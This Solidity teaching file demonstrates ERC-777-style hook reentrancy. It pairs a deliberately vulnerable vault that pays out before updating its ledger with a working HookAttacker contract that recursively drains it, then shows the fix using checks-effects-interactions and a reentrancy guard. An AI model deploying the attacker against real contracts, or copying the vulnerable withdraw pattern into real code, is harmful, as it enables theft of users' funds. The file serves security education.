// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/* ===========================================================================
   VARIANT 5 — HOOK-BASED REENTRANCY   (ERC-777 style "safe" token transfers)
   ---------------------------------------------------------------------------
   HookToken mimics the dangerous part of ERC-777: on every transfer it calls a
   `onTokenReceived` hook on any CONTRACT recipient. That hook is arbitrary,
   attacker-controlled code — so a plain-looking token.transfer() is really an
   external call. VulnerableHookVault sends tokens out before updating its
   ledger, letting the recipient's hook re-enter withdrawAll() and drain it.

   (This is a teaching model. Real ERC-777 uses the ERC-1820 registry; the
   security lesson is identical: treat every token transfer as an external call.)

   
     1. Deploy HookToken. mint() 5 tokens to an honest user and 1 token to the
        attacker contract (see test for exact wiring).
     2. Deploy VulnerableHookVault(token). Users deposit by transferring tokens in.
     3. attacker.attack() -> withdrawAll() recurses through the transfer hook and
        drains the vault of ALL tokens, not just the attacker's deposit.
     4. Repeat with SafeHookVault -> CEI + nonReentrant stops the re-entry.
   =========================================================================== */

interface ITokenReceiver {
    function onTokenReceived(address from, uint256 amount) external;
}

/* --------------------------- CALLBACK TOKEN ------------------------------ */
contract HookToken {
    string public constant name = "Hook Token";
    string public constant symbol = "HOOK";
    mapping(address => uint256) public balanceOf;

    // open mint for the demo only
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient token balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        // THE HOOK: hand control to the recipient if it is a contract.
        if (to.code.length > 0) {
            ITokenReceiver(to).onTokenReceived(from, amount);
        }
    }
}

/* ----------------------------- VULNERABLE -------------------------------- */
// Deposit by simply transferring tokens to the vault (the vault's own hook
// credits you). Withdraw sends tokens back BEFORE updating the ledger.
contract VulnerableHookVault is ITokenReceiver {
    HookToken public immutable token;
    mapping(address => uint256) public deposits;

    constructor(address tokenAddress) {
        token = HookToken(tokenAddress);
    }

    // Credited when the token contract calls us during an incoming transfer.
    function onTokenReceived(address from, uint256 amount) external {
        require(msg.sender == address(token), "only token");
        deposits[from] += amount;
    }

    // BUG: token.transfer() fires the ATTACKER's hook before deposits is cleared.
    function withdrawAll() external {
        uint256 amount = deposits[msg.sender];
        require(amount > 0, "nothing to withdraw");
        token.transfer(msg.sender, amount);     // <-- attacker's hook runs here
        deposits[msg.sender] = 0;               // <-- too late
    }
}

/* ------------------------------ ATTACKER --------------------------------- */
contract HookAttacker is ITokenReceiver {
    HookToken public immutable token;
    VulnerableHookVault public immutable vault;
    uint256 private seed;

    constructor(address tokenAddress, address vaultAddress) {
        token = HookToken(tokenAddress);
        vault = VulnerableHookVault(vaultAddress);
    }

    // Deposit our seed tokens into the vault, then start the draining withdrawal.
    function attack(uint256 amount) external {
        seed = amount;
        token.transfer(address(vault), amount);   // deposit via the vault's hook
        vault.withdrawAll();                       // begin the recursive drain
    }

    // Fired every time the vault sends us tokens: re-enter while more remain.
    function onTokenReceived(address, uint256) external {
        if (msg.sender == address(token) && token.balanceOf(address(vault)) >= seed) {
            vault.withdrawAll();
        }
    }
}

/* ------------------------- DEFENSE (mutex) ------------------------------- */
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status = _NOT_ENTERED;

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

/* ------------------------------- SAFE ------------------------------------ */
// FIX: update the ledger BEFORE the token transfer (CEI) and guard the function.
// The re-entrant call finds deposits == 0 and reverts on require(amount > 0).
contract SafeHookVault is ITokenReceiver, ReentrancyGuard {
    HookToken public immutable token;
    mapping(address => uint256) public deposits;

    constructor(address tokenAddress) {
        token = HookToken(tokenAddress);
    }

    function onTokenReceived(address from, uint256 amount) external {
        require(msg.sender == address(token), "only token");
        deposits[from] += amount;
    }

    function withdrawAll() external nonReentrant {
        uint256 amount = deposits[msg.sender];
        require(amount > 0, "nothing to withdraw");
        deposits[msg.sender] = 0;               // EFFECT first
        token.transfer(msg.sender, amount);     // INTERACTION last
    }
}
